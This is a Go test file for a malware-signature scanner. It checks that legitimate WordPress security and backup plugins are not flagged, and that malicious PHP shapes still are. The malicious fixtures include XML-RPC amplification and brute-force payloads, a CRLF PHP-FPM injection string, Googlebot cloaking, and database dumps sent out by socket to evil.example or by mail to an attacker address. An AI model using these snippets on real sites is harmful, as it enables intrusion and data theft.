package signatures

import "testing"

// FP reconstructions for the 2026-06-16 forensic sweep. Each rule below fired
// on legitimate WordPress security/backup plugin code that references attack
// tokens without performing the attack. Negative cases reproduce the real FPs;
// positive cases keep genuine malicious shapes detectable after the fix.

// --- exploit_wp_xmlrpc ---------------------------------------------------

// A plugin that DISABLES xmlrpc references xmlrpc.php and the bare string
// system.multicall (to unset it from the method list), but carries no XML-RPC
// method-call payload. It must not be flagged as an attack.
func TestExploitWPXmlrpc_DisablingPluginIsNotAttack(t *testing.T) {
	scanner := loadRepoScanner(t)
	legit := []byte(`<?php
// Site Enhancements: harden xmlrpc.php against amplification.
add_filter( 'xmlrpc_methods', function ( $methods ) {
	unset( $methods['system.multicall'] );
	unset( $methods['pingback.ping'] );
	return $methods;
} );
add_filter( 'xmlrpc_enabled', '__return_false' );
`)
	if hasRule(scanner.ScanContent(legit, ".php"), "exploit_wp_xmlrpc") {
		t.Error("exploit_wp_xmlrpc FP: matched a plugin that disables xmlrpc (xmlrpc.php + bare system.multicall string, no method-call payload)")
	}
}

func TestExploitWPXmlrpc_MulticallPayloadDetected(t *testing.T) {
	scanner := loadRepoScanner(t)
	malicious := []byte(`<?php
$url = 'http://victim.example/xmlrpc.php';
$body = '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName>'
	. '<params><param><value><array><data></data></array></value></param></params></methodCall>';
$resp = $sender( $url, $body );
`)
	if !hasRule(scanner.ScanContent(malicious, ".php"), "exploit_wp_xmlrpc") {
		t.Error("exploit_wp_xmlrpc regression: system.multicall amplification payload was not detected")
	}
}

func TestExploitWPXmlrpc_GetUsersBlogsPayloadDetected(t *testing.T) {
	scanner := loadRepoScanner(t)
	malicious := []byte(`<?php
$body = '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName>'
	. '<params><param><value>admin</value></param></params></methodCall>';
$resp = $sender( 'http://victim.example/xmlrpc.php', $body );
`)
	if !hasRule(scanner.ScanContent(malicious, ".php"), "exploit_wp_xmlrpc") {
		t.Error("exploit_wp_xmlrpc regression: wp.getUsersBlogs brute-force payload was not detected")
	}
}

// --- exploit_php_fpm_rce -------------------------------------------------

// Wordfence WAF bootstrap sets auto_prepend_file and references PATH_INFO and
// PHP_VALUE to install itself, but carries no CRLF FastCGI injection payload.
func TestExploitPHPFPM_WordfenceWAFBootstrapIsNotExploit(t *testing.T) {
	scanner := loadRepoScanner(t)
	legit := []byte(`<?php
// Wordfence WAF auto_prepend_file bootstrap.
// Installs via php_value auto_prepend_file and reads PATH_INFO / PHP_VALUE
// from the request environment to locate the real script.
if ( isset( $_SERVER['PATH_INFO'] ) ) {
	define( 'WFWAF_AUTO_PREPEND', true );
}
$wafConfig = getenv( 'PHP_VALUE' );
`)
	if hasRule(scanner.ScanContent(legit, ".php"), "exploit_php_fpm_rce") {
		t.Error("exploit_php_fpm_rce FP: matched Wordfence WAF bootstrap (auto_prepend_file/PATH_INFO/PHP_VALUE config keywords, no CRLF payload)")
	}
}

func TestExploitPHPFPM_CRLFInjectionDetected(t *testing.T) {
	scanner := loadRepoScanner(t)
	malicious := []byte(`<?php
$payload = "PATH_INFO" . "\n" . 'X-PHP-VALUE: ' ;
$req = "/index.php%0d%0aPHP_VALUE:auto_prepend_file%3dphp://input%0d%0a";
$sender( $target, $req );
`)
	if !hasRule(scanner.ScanContent(malicious, ".php"), "exploit_php_fpm_rce") {
		t.Error("exploit_php_fpm_rce regression: CVE-2019-11043 CRLF PHP_VALUE injection was not detected")
	}
}

// --- spam_conditional_googlebot -----------------------------------------

// Wordfence wfCrawl.php verifies Googlebot via user agent and reverse DNS,
// returning a bool. It serves no different content, so it must not be flagged
// as conditional spam cloaking.
func TestSpamGooglebot_WordfenceCrawlVerifyIsNotCloaking(t *testing.T) {
	scanner := loadRepoScanner(t)
	legit := []byte(`<?php
class wfCrawl {
	public static function isGoogleCrawler( $userAgent = null ) {
		if ( $userAgent === null ) {
			$userAgent = $_SERVER['HTTP_USER_AGENT'];
		}
		if ( ! preg_match( '/Googlebot\/\d\.\d/', $userAgent ) ) {
			return false;
		}
		$host = gethostbyaddr( $_SERVER['REMOTE_ADDR'] );
		return (bool) preg_match( '/\.googlebot\.com$/i', $host );
	}
}
`)
	if hasRule(scanner.ScanContent(legit, ".php"), "spam_conditional_googlebot") {
		t.Error("spam_conditional_googlebot FP: matched Wordfence crawler verification (UA + reverse DNS, no content cloaking)")
	}
}

func TestSpamGooglebot_RemoteIncludeCloakingDetected(t *testing.T) {
	scanner := loadRepoScanner(t)
	malicious := []byte(`<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if ( strpos( $ua, 'Googlebot' ) !== false ) {
	echo file_get_contents( 'http://spam.example/links.php?host=' . $_SERVER['HTTP_HOST'] );
	exit;
}
`)
	if !hasRule(scanner.ScanContent(malicious, ".php"), "spam_conditional_googlebot") {
		t.Error("spam_conditional_googlebot regression: Googlebot-conditional remote spam include was not detected")
	}
}

func TestSpamGooglebot_RedirectCloakingDetected(t *testing.T) {
	scanner := loadRepoScanner(t)
	malicious := []byte(`<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if ( stripos( $ua, 'Googlebot' ) !== false ) {
	header( 'Location: http://spam.example/cloak/' );
	exit;
}
`)
	if !hasRule(scanner.ScanContent(malicious, ".php"), "spam_conditional_googlebot") {
		t.Error("spam_conditional_googlebot regression: Googlebot-conditional redirect cloaking was not detected")
	}
}

func TestSpamGooglebot_PreparedContentCloakingDetected(t *testing.T) {
	scanner := loadRepoScanner(t)
	malicious := []byte(`<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if ( stristr( $ua, 'Googlebot' ) ) {
	$page = file_get_contents( 'http://spam.example/links.php' );
	print $page;
	exit;
}
`)
	if !hasRule(scanner.ScanContent(malicious, ".php"), "spam_conditional_googlebot") {
		t.Error("spam_conditional_googlebot regression: Googlebot cloak with a prepared response before output was not detected")
	}
}

// --- exfil_wp_db_dumper -------------------------------------------------

// MainWP backup module runs mysqldump via exec to a local gzip file and lists
// wp-config.php among backup files. It does not exfiltrate the dump.
func TestExfilDbDumper_MainWPLocalBackupIsNotExfil(t *testing.T) {
	scanner := loadRepoScanner(t)
	legit := []byte(`<?php
// MainWP child: create a local database backup archive.
class MainWP_Child_DB_Backup {
	public function dump( $database_name, $user, $pass, $host, $gzip_full_path ) {
		// wp-config.php is excluded from the file archive; the DB is dumped separately.
		exec( "mysqldump --user={$user} --password='{$pass}' --host={$host} {$database_name} | gzip > {$gzip_full_path}", $output, $result );
		return $result;
	}
}
`)
	if hasRule(scanner.ScanContent(legit, ".php"), "exfil_wp_db_dumper") {
		t.Error("exfil_wp_db_dumper FP: matched MainWP local backup (mysqldump to a local gzip file, no exfil sink)")
	}
}

func TestExfilDbDumper_LocalBackupManifestWriteIsNotExfil(t *testing.T) {
	scanner := loadRepoScanner(t)
	legit := []byte(`<?php
// Backup job: wp-config.php is excluded from the file archive.
exec( "mysqldump --user={$user} --password='{$pass}' wordpress | gzip > {$gzip_full_path}", $output, $result );
$fh = fopen( '/tmp/backup-manifest.txt', 'wb' );
fwrite( $fh, "database backup complete" );
fclose( $fh );
`)
	if hasRule(scanner.ScanContent(legit, ".php"), "exfil_wp_db_dumper") {
		t.Error("exfil_wp_db_dumper FP: matched local backup metadata fwrite with no network or response exfil sink")
	}
}

func TestExfilDbDumper_ConfigReadLocalDumpDetected(t *testing.T) {
	scanner := loadRepoScanner(t)
	malicious := []byte(`<?php
$cfg = file_get_contents( ABSPATH . '/wp-config.php' );
shell_exec( "mysqldump -u" . $user . " -p" . $pass . " wordpress > /tmp/local.sql" );
`)
	if !hasRule(scanner.ScanContent(malicious, ".php"), "exfil_wp_db_dumper") {
		t.Error("exfil_wp_db_dumper regression: wp-config file read followed by a local mysqldump was not detected")
	}
}

func TestExfilDbDumper_SocketWriteDetected(t *testing.T) {
	scanner := loadRepoScanner(t)
	malicious := []byte(`<?php
// wp-config.php tells the dropper which local database to steal.
$sock = fsockopen( 'evil.example', 4444 );
system( "mysqldump -u root -psecret wordpress > /tmp/d.sql" );
fwrite( $sock, file_get_contents( '/tmp/d.sql' ) );
`)
	if !hasRule(scanner.ScanContent(malicious, ".php"), "exfil_wp_db_dumper") {
		t.Error("exfil_wp_db_dumper regression: dump sent through a socket write was not detected")
	}
}

func TestExfilDbDumper_DumpAndMailDetected(t *testing.T) {
	scanner := loadRepoScanner(t)
	malicious := []byte(`<?php
$cfg = file_get_contents( 'wp-config.php' );
system( "mysqldump -u root -psecret wordpress > /tmp/d.sql" );
mail( 'attacker@evil.example', 'db', file_get_contents( '/tmp/d.sql' ) );
`)
	if !hasRule(scanner.ScanContent(malicious, ".php"), "exfil_wp_db_dumper") {
		t.Error("exfil_wp_db_dumper regression: dump-then-mail credential theft was not detected")
	}
}

func TestExfilDbDumper_DumpAndReadfileDetected(t *testing.T) {
	scanner := loadRepoScanner(t)
	malicious := []byte(`<?php
include 'wp-config.php';
shell_exec( "mysqldump -u" . DB_USER . " -p" . DB_PASSWORD . " " . DB_NAME . " > /tmp/x.sql" );
readfile( '/tmp/x.sql' );
`)
	if !hasRule(scanner.ScanContent(malicious, ".php"), "exfil_wp_db_dumper") {
		t.Error("exfil_wp_db_dumper regression: dump-then-readfile-to-response credential theft was not detected")
	}
}
